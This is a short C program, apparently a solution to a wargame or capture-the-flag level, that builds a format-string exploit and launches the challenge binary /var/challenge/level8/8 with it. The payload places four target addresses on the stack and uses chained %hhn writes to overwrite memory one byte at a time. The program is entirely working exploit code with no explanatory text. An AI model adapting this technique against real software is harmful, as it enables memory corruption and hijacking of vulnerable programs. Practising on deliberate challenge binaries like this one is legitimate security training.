#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
   
   // Initialize payload buffer to zero

    char payload[256];
    memset(payload, 0, sizeof(payload));

    // Construct the payload
    snprintf(payload, sizeof(payload),
             "AA" // AA for alignment                
             "\x10\xa0\x04\x08"          
             "\x11\xa0\x04\x08"          
             "\x12\xa0\x04\x08"          
             "\x13\xa0\x04\x08"          
             "_%%166x%%71$hhn"           
             "%%64x%%70$hhn"             
             "%%254x%%69$hhn"           
             "%%40x%%68$hhn");             
    
    // Execute /var/challenge/level8/8 with the crafted payload
    execl("/var/challenge/level8/8", "8", payload, NULL);

    return 0;
}

